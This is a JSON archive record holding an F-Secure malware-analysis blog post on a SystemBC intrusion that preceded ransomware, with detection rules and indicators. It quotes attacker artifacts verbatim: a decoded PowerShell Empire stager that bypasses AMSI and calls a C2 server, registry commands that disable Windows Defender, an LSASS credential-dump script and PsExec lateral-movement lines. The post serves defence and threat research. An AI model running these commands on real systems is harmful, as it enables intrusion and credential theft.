{
    "id": "f85893b2-b9a8-42b8-bc95-3a53c75da0c4",
    "created_at": "2023-01-12T15:02:58.660516Z",
    "updated_at": "2025-03-27T02:09:07.338328Z",
    "deleted_at": null,
    "sha1_hash": "97016e3ec8e82d2a38f0c10b1fd6b74e32d98366",
    "title": "2021-05-10 - Prelude to Ransomware- SystemBC",
    "authors": "",
    "file_creation_date": "2022-05-28T18:31:00Z",
    "file_modification_date": "2022-05-28T18:31:00Z",
    "file_size": 1752403,
    "plain_text": "# Prelude to Ransomware: SystemBC\n\n**labs.f-secure.com/blog/prelude-to-ransomware-systembc/**\n\n## Introduction\n\nIn late February 2021, F-Secure’s Managed Detection and Response (MDR) service identified the execution of\nSystemBC malware as part of a hands on keyboard crimeware intrusion. The intrusion was stopped before the threat\n[actor could reach their objective, but in recent reporting the use of this malware has been tied to Ransomware activity.](https://news.sophos.com/en-us/2020/12/16/systembc/)\nF-Secure was also able to identify another recent intrusion conducted by the threat actor where they had deployed Ryuk\nransomware.\n\nF-Secure’s analysis of the SystemBC sample identified that this was a new variant of the malware, with several notable\ndifferences from previous versions. The sample was executed by a previously undocumented “wrapper”, which FSecure’s research suggests has been used in combination with multiple malware families common in crimeware\nintrusions.\n\nThis blog shall provide insight in to both the intrusion and the malware sample, so that organizations can be informed to\nprotect themselves from this evolving threat. A detection section is included, which contains actionable takeaways so\nthat organizations can improve their own defenses against this, and similar, threats.\n\n## Intrusion Technical Detail\n\nThe intrusion began in a third-party IT service provider, which had an un-patched VPN appliance that was vulnerable to\nremote exploitation. The threat actor was able to extract credentials from this device and then access a host with\nconnectivity to the victim network. The threat actor entered the victim network via a Remote Desktop Protocol (RDP)\nconnection using stolen credentials of an administrator account belonging to that third-party IT service provider.\n\nFigure 1: Initial Access Attack Path\n\n\n-----\n\nOnce the RDP session had connected the threat actor immediately began to enumerate the victim domain and network.\nWith an interactive PowerShell session they used the Windows utilities like net.exe, ping.exe and nltest.exe.\n```\nC:\\Windows\\System32\\net.exe group \"enterprise admins\" /domain\nC:\\Windows\\System32\\net.exe user <USER> /domain\nC:\\Windows\\System32\\net.exe group \"domain admins\" /domain\nC:\\Windows\\System32\\net.exe group \"domain computers\" /domain\nC:\\Windows\\System32\\nltest.exe /dclist: <DOMAIN>\n\n```\nFigure 2: Enumeration Command Lines\n\nShortly after this they scanned the network using a portable version of Advanced IP Scanner, a tool popular in\ncrimeware circles. The scanner was used to sweep multiple sub-networks for normal service ports and dynamic ranges.\n```\n%USERPROFILE%\\Downloads\\Advanced_IP_Scanner_2.5.3850.exe\n\n```\nFigure 3: Advanced IP Scanner Path\n\nThe scanner was downloaded from the software provider’s website via internet explorer and executed with explorer.exe.\n[F-Secure’s investigation uncovered a forensic artifact that suggests the threat actor was watching a YouTube video on](https://www.youtube.com/embed/NCc3xINQL0c?vq=large)\nhow to use this tool prior to execution.\n\nAfter initial reconnaissance, the adversary executed a Base64 encoded PowerShell command. The decoded command\nis included below.\n```\nIf($PSVERsIONTabLe.PSVERSIoN.MajOR -ge 3){$GPF=\n[ref].ASsEMBly.GetTypE('System.Management.Automation.Utils').\"GeTFIe`lD\"\n('cachedGroupPolicySettings','N'+'onPublic,Static');IF($GPF)\n{$GPC=$GPF.GetVALUE($nuLL);If($GPC['ScriptB'+'lockLogging']){$GPC['ScriptB'+'lockLogging']\n['EnableScriptB'+'lockLogging']=0;$GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$vAl=\n[CoLLectIonS.GenErIc.DICTIONary[String,SYSTEm.OBJECT]]::New();$val.Add('EnableScriptB'+'lockLogging',0);$VAl.AD\n('signatures','N'+'onPublic,Static').SeTVaLue($nuLL,(New-ObjecT COllEcTiONs.GenERIC.HashSET[StRINg]))}\n[ReF].ASSeMBly.GEtTyPE('System.Management.Automation.AmsiUtils')|?{$_}|%\n{$_.GEtFiELd('amsiInitFailed','NonPublic,Static').SETValue($NULL,$tRUe)};};\n[SySTEm.NeT.SERVIcePoINTMaNAGeR]::ExpecT100ContInue=0;$wc=NEw-OBJECt SYstEM.NeT.WEBCLIENT;$u='Mozilla/5.0\n(Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeAdeRS.AdD('UserAgent',$u);$WC.PRoXy=[System.Net.WeBRequest]::DefaULtWeBProXY;$Wc.PrOXY.CRedeNTiALS =\n[SysTEm.NeT.CrEDeNtIaLCAChe]::DEFAULtNEtwORKCREdENTiALs;$Script:Proxy = $wc.Proxy;$K=\n[System.TEXt.ENCoding]::ASCII.GEtBYTES('b3a9ff9c3041b9841a771013e1ac9f21');$R={$D,$K=$ArGs;$S=0..255;0..255|%\n{$J=($J+$S[$_]+$K[$_%$K.CoUNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=\n($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_bXor$S[($S[$I]+$S[$H])%256]}};$ser='https://193.29.104.187/:443';$t='/news.php';$WC.HeadERs.ADd(\"Cookie\",\"sessi\njOIn[Char[]](& $R $DaTa ($IV+$K))|IEX\n\n```\nFigure 4: Decoded PowerShell Command\n\nThe command is associated with the PowerShell Empire framework and disables ScriptBlock logging and AMSI before\nconnecting out to an external Command and Control (C2) server. The threat actor was using the default version of\nPowerShell Empire with the following C2 and UserAgent:\n```\nC2: https://193.29.104[.]187/news.php\nUser-agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\n\n```\nFigure 5: PSE C2 & User Agent\n\nAfter establishing C2 communication through PowerShell Empire and conducting additional reconnaissance, the actor\ndisabled Windows Defender with multiple registry changes using reg.exe.\n\n\n-----\n\n```\n g py\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiVirus /t REG_DWORD /d 1 /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v MpEnablePus /t REG_DWORD /d 0 /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\nDisableBehaviorMonitoring /t REG_DWORD /d 1 /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableIOAVProtection\n/t REG_DWORD /d 1 /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\nDisableOnAccessProtection /t REG_DWORD /d 1 /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\nDisableRealtimeMonitoring /t REG_DWORD /d 1 /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\nDisableRoutinelyTakingAction /t REG_DWORD /d 1 /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\nDisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v DisableEnhancedNotifications /t\nREG_DWORD /d 1 /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v DisableBlockAtFirstSeen /t REG_DWORD\n/d 1 /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v SpynetReporting /t REG_DWORD /d 0 /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v SubmitSamplesConsent /t REG_DWORD /d\n2 /f\nreg.exe delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f\n\n```\nFigure 6: \"reg.exe\" Command Lines\n\nImmediately after Windows Defender was disabled the actor downloaded an archive from “sendspace[.]com” – an online\nfile sharing platform.\n```\nhXXps://fs12n1.sendspace[.]com/dl/2dcbf9eb9e28920a81febd3f0a8cda84/6039c40226878d2e/px2kd3/1.rar\n\n```\nFigure 7: Malicious Archive URL\n\nOnce extracted from the archive then the file “Svchost.exe”\n(2dc93817039e6fa4fae014e1386cffa7ac35b89feac59d8abe7f51be1c089580) was executed. F-Secure’s analysis shows\nthis file is a new variant of the SystemBC malware family. Full analysis of the malware is included later in this post.\n\nFigure 8: SystemBC Download\n\nWith multiple routes of access established to the network the threat actor then downloaded another archive, from the\nsame domain, containing four additional files.\n```\nhXXps://fs12n5.sendspace[.]com/dl/5593c4325c0f9c23cb59661893ae9454/6039c46105fab7d4/3dugcw/2.zip\n\n```\nFigure 9: Additional Malicious Archive URL\n\nThe files downloaded were stored on a share that was mapped for all hosts on the victim network\n\n\n-----\n\n```\n1.ps1\na.ps1\nPsExec.exe\n\n```\nFigure 10: Archive Contents\n\nThe first file of interest, servers0.bat, was a batch file that contained a long list of commands to execute the “1.ps1”\nPowerShell script on multiple hosts using PsExec.exe.\n```\nstart PsExec.exe -d \\\\<hostname> -u \"<username>\" -p \"<pass>\" -accepteula -s cmd /c \"powershell.exe ExecutionPolicy Bypass -file \\\\<share>\\l.ps1\"\nstart PsExec.exe -d \\\\<hostname> -u \"<username>\" -p \"<pass>$\" -accepteula -s cmd /c \"powershell.exe ExecutionPolicy Bypass -file \\\\<share>\\l.ps1\"\nstart PsExec.exe -d \\\\<hostname> -u \"<username>\" -p \"<pass>$\" -accepteula -s cmd /c \"powershell.exe ExecutionPolicy Bypass -file \\\\<share>\\l.ps1\"\nstart PsExec.exe -d \\\\<hostname> -u \"<username>\" -p \"<pass>$\" -accepteula -s cmd /c \"powershell.exe ExecutionPolicy Bypass -file \\\\<share>\\l.ps1\"\n…\n\n```\nFigure 11: Truncated Contents of \"servers0.bat\"\n\nThe PowerShell script “1.ps1” would attempt to create a dump of the [LSASS process using rundll32.exe in combination](https://docs.microsoft.com/en-us/windows/win32/secauthn/lsa-authentication)\nwith comsvcs.dll. If successful the threat actor would look to extract any credentials stored in the memory of this process\nusing tools such as Mimiktaz.\n```\n$computerName = $env:computername;\n$procid = Get-Process | Where-Object {$_.ProcessName -eq 'lsass'} | Select-Object Id\nPowershell -c rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $procid.Id $Env:TEMP$computerName full\nStart-Sleep -s 59\nCopy-Item -Path $Env:TEMP$computerName -Destination \"\\\\<hostname>\\<share>\\$($computerName)\"\n\n```\nFigure 12: Contents of \"1.ps1\"\n\nIn addition, the threat actor deployed a PowerShell script named “a.ps1” that had the capability to further enumerate\nhosts across the network. Interestingly the file still had the hostname and domain from a previous intrusion of another\nvictim by the group, which allowed F-Secure to notify that victim of the activity. F-Secure did not see any evidence of the\nexecution of this script despite its creation on victim systems by the threat actor.\n```\n$path = \"\\\\<hostname>.<domain>\\s$\\\" + $env:computername;\n$OutputVariable = (cmd.exe /c tasklist /v) | Out-File -FilePath \"$($path)_task.txt\" -Append;\n$OutputVariable = (cmd.exe /c arp -a) | Out-File -FilePath \"$($path)_arp.txt\" -Append;\n$OutputVariable = (cmd.exe /c dir C:\\users) | Out-File -FilePath \"$($path)_users.txt\" -Append;\n\n```\nFigure 13: Contents of \"a.ps1\"\n\nThe actor was not able to execute any further malicious commands as containment was actioned by the F-Secure MDR\nservice and the victim organization.\n\n## \"Svchost.exe\" Analysis - SystemBC\n\n**File Name: svchost.exe**\n\n**SHA1: f8af1b293aecdb3d1fe038b4b638f283ee852287**\n\n**MD5: fa93cfe0898c704551cefdfa193d406f**\n\n**SHA256: 2dc93817039e6fa4fae014e1386cffa7ac35b89feac59d8abe7f51be1c089580**\n\n**Path: C:\\Users\\Public\\svchost.exe**\n\n**Execution Command Line: C:\\Users\\Public\\svchost.exe start**\n\n**Wrapper**\n\n\n-----\n\nThe svchost.exe binary is a wrapper that contains an encrypted SystemBC payload. When the wrapper executes, it\ndecrypts the payload and injects it into the memory of a child process. The technique used is commonly known as\nprocess hollowing.\n\nAll the key APIs of wrapper are resolved at runtime. After the resolution routine, it creates a new process using its own\ncommand line. A new child process is then created out of the wrapper disk image.\n\nFigure 14: Process Command Line\n\nThe child is launched as suspended, this is done to allow subsequent process injection into the new child process. The\nwrapper uses NtUnmapViewOfSection to empty the target process memory.\n\nFigure 15: NtUnmapViewOfSection Code\n\n0x7000 bytes of new memory is allocated into the child process with VirtualAllocEx at offset 0x400000 and the\npermissions of the section are set to PAGE_EXECUTE_READWRITE with flprotect = 0x40. The SystemBC backdoor is\nthen decrypted and injected into the new memory space with WriteProcessMemory.\n\nFigure 16: WriteProcessMemory Code\n\nAfter the required code is injected, the wrapper finally sets the main thread context in the child to point to the correct\nentry point 0x1000 and calls ResumeThread on the child process. The use of process hollowing ensures the unpacked\nmalicious code is only visible in the process memory and not the on-disk version of the file.\n\n\n-----\n\nFigure 17: Wrapper Execution Flow\n\nPivoting from the debug string found in the wrapper “y:\\test4\\e93\\Debug\\e93.pdb” we can see multiple other samples,\n[with other payloads such as Bazar Loader. The earliest observed malware sample in F-Secure's telemetry dates back to](https://www.virustotal.com/gui/file/9916d1369c9d2d0e64a8d5d9bb185a63386c27949b46fcec479ff024f3326340/details)\nDecember 2019. There were over 300 samples in total that contain a similar PDB path and appear to be the same\nwrapper. The table below includes a selected few examples.\n\nPDB Path Compilation Time Stamp\n\ny:\\test4\\104\\Debug\\104.pdb 2019-12-15 18:02\n\ny:\\test4\\a30\\Debug\\a30.pdb 2020-08-09 11:58\n\ny:\\test4\\e45\\Debug\\e45.pdb 2020-09-06 17:07\n\ny:\\test4\\e62\\Debug\\e62.pdb 2020-12-01 10:43\n\ny:\\test4\\e88\\Debug\\e88.pdb 2021-01-11 10:19\n\ny:\\test4\\e93\\Debug\\e93.pdb 2021-02-23 21:32\n\ny:\\test4\\e97\\Debug\\e97.pdb 2021-03-02 17:55\n\ny:\\test4\\e98\\Debug\\e98.pdb 2021-03-10 16:07\n\ny:\\test4\\e98\\Debug\\e98.pdb 2021-03-13 23:22\n\ny:\\test4\\e94\\Debug\\e94.pdb 2021-03-20 10:16\n\nThe PDB paths suggest a single environment is used to compile the malware. This is likely linked to a single malware\ndeveloper or team. Artifacts within the binaries suggest that the author is Russian speaking, which aligns with FSecure's knowledge of the wider crimeware actor who conducted the intrusion.\n\n**SystemBC Payload**\n\nAs [reported by Sophos, SystemBC is known as an “off-the-shelf” piece of malware, which is bundled with a TOR client](https://news.sophos.com/en-us/2020/12/16/systembc/)\n[to phone home via the TOR network. In an even earlier version, found by Proofpoint in 2019, the malware was using a](https://www.proofpoint.com/us/threat-insight/post/systembc-christmas-july-socks5-malware-and-exploit-kits)\nSOCKS5 proxy. The SystemBC payload analyzed by F-Secure shares a number of key capabilities with the previously\nreported samples.\n\n\n-----\n\nAt the first time executing it will create a scheduled task for persistence via a COM interface (CLSID: 148BD52A A2AB\n11CE-B11F-00AA00530503). The scheduled task is created from the wrapper image, named “wow64”, given the “start”\nargument and scheduled to run every two minutes after the first execution at current time. The CLSID is located in the\n.data section starting at 0x50C3.\n\nThe malware executes files received from the C2 after writing the files out to %TEMP%. It supports execution of EXE,\nVBS, BAT, CMD and PS1 file types.\n\nFigure 18: C2 Identification Routine\n\n\n-----\n\nPS1 files will be executed with PowerShell using the parameters WindowStyle Hidden ep bypass file and the\npayload, which is identical to the other public samples analyzed by security researchers. Other file types will be\nexecuted via a scheduled task, the same COM interface that is used for its own persistence.\n\nFigure 19: Execution Flow\n\n**SystemBC: A new variant?**\n\nThe sample analyzed by F-Secure also had significant differences to those previously analyzed. The SystemBC payload\nwas smaller than previous 2020 versions, with the size of the unpacked payload being just 28 KB as opposed to the\nTOR version which is 44 KB. The new version lacked previously observed features such as the TOR client, AV search\nand binary relocation on disk. The following sections explore those differences in more detail.\n\nInitialization\n\nWhen the SystemBC payload F-Secure analyzed is executed, it will search and create a mutex “wow64”. Then it calls\nsub_402985 to check if the passed command line argument equals to “start”. If the mutex was not found and the file was\nexecuted with “start”, it will continue to the sub_401549 to execute the C2 commands.\n\n\n-----\n\nFigure 20: Initialization Function (New Version)\n\nIn the older version of SystemBC, the name of the process will be used as a mutex. The initialization is fairly similar to\nthe new sample with few differences. The old sample will attempt to find the a2guard.exe process, which is linked to an\nanti-virus product belonging to Emisoft. If the process is found the sample will exit without establishing a persistence. If\nstart argument is missing, the file will be copied into a random directory under ProgramData.\n\nFigure 21: Initialization Function (Old Version)\n\nIn both samples, if the “start” argument is missing, a scheduled task will be created from the disk image with “start”\nargument.\n\nC2 Callback\n\nBefore SystemBC calls the C2 server, it will collect some basic information from the host.\n\nUsername\nThe Windows build number for the infected system\nA WOW process check (32-bit or 64-bit detection)\nThe volume serial number\n\n\n-----\n\nFigure 22: RtlGetVersion and IsWow64Process APIs Runtime Resolution (New Version)\n\nIn the older version, which has TOR capabilities, the sample is implementing a small TOR client that according to\n[Sophos is likely a C implementation of the open source mini-tor written in C++. The C2 communications are then routed](https://github.com/wbenny/mini-tor/)\nvia TOR.\n\n\n-----\n\nFigure 23: C2 Code (Old Version)\n\nIn the newer sample, it is lacking the TOR client code completely and the C2 communications are implemented with\nsockets over IPV4 TCP protocol and non-standard ports. The XOR routine is called to decrypt the required port number\nfrom the .data section inside the binary.\n\n\n-----\n\nFigure 24: Call WSAStartup and Decrypt Port Number (New Version)\n\nThe malware then continues with the C2 connection, decrypting the IP-address with the same XOR function as well as\nbuilding the required parameters to make a network connection.\n\n\n-----\n\nFigure 25: C2 IP Decryption & Socket Creation (New Version)\n\nXOR\n\nInterestingly throughout the old and new samples, the XOR decryption function at offset 0x2C07 is called multiple times\nfor different strings loaded from the memory of the process. The decryption function is looking at the boundaries of the\nstart of the decryption key and the end of the encrypted data section to determine whether a passed string is located\ninside it and requires decryption or not.\n\n\n-----\n\nFigure 26: Decryptor Function\n\nThis could suggest that there is support for further obfuscation in SystemBC by encrypting more of the plaintext strings.\nThe XOR decryption key used is 40 bytes long and located at the beginning of a .data section at 0x5000. The C2 details\nare located immediately after the key.\n\n[This kind of XOR function and the configuration have been observed in even older samples from 2019. The new](https://twitter.com/VK_Intel/status/1123880277170892800)\nsample analyzed is very similar to previously observed samples in terms of capability, but as discussed above has a\ndifferent implementation for initialization and C2. The earliest sample of this SystemBC version was observed at the\nbeginning of January 2021.\n\n## Indicators & Detection\n\nDetection\n\nThe below table contains the offensive techniques mentioned within this report mapped to open source detection\n[framework Sigma. This framework allows the conversion of detection logic in to many formats for use across a wide](https://github.com/SigmaHQ/sigma)\nrange of industry detection tooling. A fidelity rating is included within the rules to provide guidance on how to implement\nthese rules within internal scoring and alerting systems.\n\n_n.b. - The fidelity rating may vary dependant on the specifics of your environment_\n\nDetection Context SIGMA Rule Fidelity\n\nPowerShell Empire Execution [Empire PowerShell Launch Parameters](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/process_creation/win_susp_powershell_empire_launch.yml) High\n\nPowerShell Empire Execution [Suspicious PowerShell Invocations - Generic](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/powershell/powershell_suspicious_invocation_generic.yml) High\n\nPowerShell Empire Execution [Suspicious PowerShell Parameter Substring](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/process_creation/win_powershell_suspicious_parameter_variation.yml) High\n\nPowerShell Empire C2 Traffic [Empire UserAgent URI Combo](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/proxy/proxy_empire_ua_uri_combos.yml) High\n\nNtdsutil Execution [Invocation of Active Directory Diagnostic Tool](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/process_creation/win_susp_ntdsutil.yml) High\n\nPsExec Lateral Movement [PsExec Tool Execution](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/other/win_tool_psexec.yml) High\n\nPsExec Lateral Movement [PsExec Service Start](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/process_creation/win_psexesvc_start.yml) High\n\nMalicious Script Execution [Antivirus Relevant File Paths Alerts](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/malware/av_relevant_files.yml) High\n\nComsvcs LSASS Dump [Process Dump via Rundll32 and Comsvcs.dll](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/process_creation/win_process_dump_rundll32_comsvcs.yml) High\n\nDisabling Windows Defender [Windows Defender Threat Detection Disabled](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/other/win_defender_disabled.yml) High\n\nNltest Execution [Domain Trust Discovery](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/process_creation/win_trust_discovery.yml) Medium\n\n\n-----\n\nAdvanced IP Scanner Execution [Advanced IP Scanner](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/process_creation/win_advanced_ip_scanner.yml) Medium\n\nNET.exe Domain Enumeration [Suspicious Reconnaissance Activity](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/process_creation/win_susp_recon_activity.yml) Medium\n\nNET.exe Local Enumeration [Local Accounts Discovery](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/process_creation/win_local_system_owner_account_discovery.yml) Low\n\nQuick Network Enumeration [Quick Execution of a Series of Suspicious Commands](https://github.com/SigmaHQ/sigma/blob/a08571be9107d1c0e216400ffbb89c394fcd2570/rules/windows/process_creation/win_multiple_suspicious_cli.yml) Low\n\nMITRE ATT&CK\n\nTactic Technique Technique\nID\n\nInitial Access External Remote Services [T1133](https://attack.mitre.org/techniques/T1133/)\n\nValid Accounts: Domain Accounts [T1078.002](https://attack.mitre.org/techniques/T1078/002/)\n\nTrusted Relationship [T1199](https://attack.mitre.org/techniques/T1199/)\n\nExecution Command & Scripting Interpreter: PowerShell [T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n\nCommand & Scripting Interpreter: Windows\nCommand Shell\n\nInter-Process Communication: Component Object\nModel\n\n\n[T1059.003](https://attack.mitre.org/techniques/T1059/003/)\n\n[T1559.001](https://attack.mitre.org/techniques/T1559/001/)\n\n\nNative API [T1106](https://attack.mitre.org/techniques/T1106/)\n\nPersistence Scheduled Task/Job: Scheduled Task [T1053.005](https://attack.mitre.org/techniques/T1053/005/)\n\n\nDefense Evasion Obfuscated Files or Information: Software\nPacking\n\nProcess Injection: Portable Executable Injection [T1055.002](https://attack.mitre.org/techniques/T1055/002/)\n\nProcess Injection: Process Hollowing [T1055.012](https://attack.mitre.org/techniques/T1055/012/)\n\nDeobfuscate/Decode Files or Information [T1140](https://attack.mitre.org/techniques/T1140/)\n\nImpair Defenses: Disable or Modify Tools [T1562.001](https://attack.mitre.org/techniques/T1562/001/)\n\n\n[T1027.002](https://attack.mitre.org/techniques/T1027/002/)\n\n\nCredential Access Exploitation for Credential Access [T1212](https://attack.mitre.org/techniques/T1212/)\n\nOS Credential Dumping: LSASS Memory [T1003.001](https://attack.mitre.org/techniques/T1003/001/)\n\nOS Credential Dumping: NTDS [T1003.003](https://attack.mitre.org/techniques/T1003/003/)\n\nDiscovery Account Discovery: Domain Account [T1087.002](https://attack.mitre.org/techniques/T1087/002/)\n\nDomain Trust Discovery [T1482](https://attack.mitre.org/techniques/T1482/)\n\nNetwork Service Scanning [T1046](https://attack.mitre.org/techniques/T1046/)\n\nNetwork Share Discovery [T1135](https://attack.mitre.org/techniques/T1135/)\n\nPermission Groups Discovery: Domain Groups [T1069.002](https://attack.mitre.org/techniques/T1069/002/)\n\nRemote System Discovery [T1018](https://attack.mitre.org/techniques/T1018/)\n\nSystem Information Discovery [T1082](https://attack.mitre.org/techniques/T1082/)\n\nLateral Movement Lateral Tool Transfer [T1570](https://attack.mitre.org/techniques/T1570/)\n\nRemote Services: Remote Desktop Protocol [T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n\n-----\n\nTactic Technique Technique\nID\n\nRemote Services: SMB/Windows Admin Shares [T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\nCommand and Control Application Layer Protocol: Web Protocols [T1071.001](https://attack.mitre.org/techniques/T1071/001/)\n\nNon-Standard Port [T1571](https://attack.mitre.org/techniques/T1571/)\n\nFiles\n\nFile Name Context SHA256\n\n\na.ps1 Enumeration\nScript\n\n1.ps1 LSASS\nDumper\n\nservers0.bat Psexec\nExecution\nScript\n\nsvchost.exe SystemBC\nMalware\n\nIP Addresses\n\n\nB953F255F799D43131FAAB437C22B883B0903704328D58F9AE8111066D7AA1E4\n\n03960062388E8068143FB6CAE203DA2954C3A43BE3306D0D326F015A14019EFF\n\n890F5323E870C49C412EECD0417D8E1F22D7FFDB8AED11FAE0810383D7C42B91\n\n2dc93817039e6fa4fae014e1386cffa7ac35b89feac59d8abe7f51be1c089580\n\n\nIP Address Context Last Observed\n\n193.29.104[.]187 PowerShell Empire 2021-02-27\n\n79.110.52[.]9 SystemBC 2021-02-27\n\n23.227.202[.]22 SyetemBC 2021-02-27\n\nURLs\n\nURL Last\nObserved\n\nhXXps://fs12n1.sendspace[.]com/dl/2dcbf9eb9e28920a81febd3f0a8cda84/6039c40226878d2e/px2kd3/1.rar 2021-0227\n\nhXXps://fs12n5.sendspace[.]com/dl/5593c4325c0f9c23cb59661893ae9454/6039c46105fab7d4/3dugcw/2.zip 2021-0227\n\nMalicious Command Lines\n\n\n-----\n\n```\nping.exe   <hostname>\nnet.exe   group \"domain computers\" /domain\nnet.exe   group \"domain admins\" /domain\nnet.exe   group \"enterprise admins\" /domain\nnet.exe   user <USER> /domain\nnet1.exe   group \"domain computers\" /domain\nnet1.exe   group \"domain admins\" /domain\nnet1.exe   group \"enterprise admins\" /domain\nnet1.exe   user <USER> /domain\nnltest.exe /dclist:\nnltest.exe /dclist:<DOMAIN>\nExecution:\nadvanced_ip_scanner.exe   /portable \"C:/Users/<USER>/Downloads/\" /lng en_us\npowershell.exe   \npowershell.exe   -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAFIAcwBJA<REDACTED>\niexplore.exe   http://www.advanced-ip-scanner.com/link.php?lng=en&ver=2-5-3850&beta=n&page=help\ncmd.exe   /C \"C:\\s$\\Servers0.bat\"\npsexec.exe -d \\\\<hostname> -u \"<username>\" -p \"<pass>\" -accepteula -s cmd /c \"powershell.exe -ExecutionPolicy\nBypass -file \\\\<share>\\l.ps1\"\nC:\\Users\\Public\\Music\\svchost.exe start\nDefensive Evasion:\nreg.exe   add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f\nreg.exe   add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiVirus /t REG_DWORD /d 1 /f\nreg.exe   add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v MpEnablePus /t REG_DWORD /d 0\n/f\nreg.exe   add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\nDisableBehaviorMonitoring /t REG_DWORD /d 1 /f\nreg.exe   add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\nDisableIOAVProtection /t REG_DWORD /d 1 /f\nreg.exe   add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\nDisableOnAccessProtection /t REG_DWORD /d 1 /f\nreg.exe   add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\nDisableRealtimeMonitoring /t REG_DWORD /d 1 /f\nreg.exe   add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\nDisableRoutinelyTakingAction /t REG_DWORD /d 1 /f\nreg.exe   add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\nDisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f\nreg.exe   add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v DisableEnhancedNotifications\n/t REG_DWORD /d 1 /f\nreg.exe   add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v DisableBlockAtFirstSeen /t\nREG_DWORD /d 1 /f\nreg.exe   add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v SpynetReporting /t REG_DWORD /d\n0 /f\nreg.exe   add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v SubmitSamplesConsent /t\nREG_DWORD /d 2 /f\nreg.exe   delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-10 - Prelude to Ransomware- SystemBC.pdf"
    ],
    "report_names": [
        "2021-05-10 - Prelude to Ransomware- SystemBC.pdf"
    ],
    "threat_actors": [
        {
            "id": "dfee8b2e-d6b9-4143-a0d9-ca39396dd3bf",
            "created_at": "2022-10-25T16:07:24.467088Z",
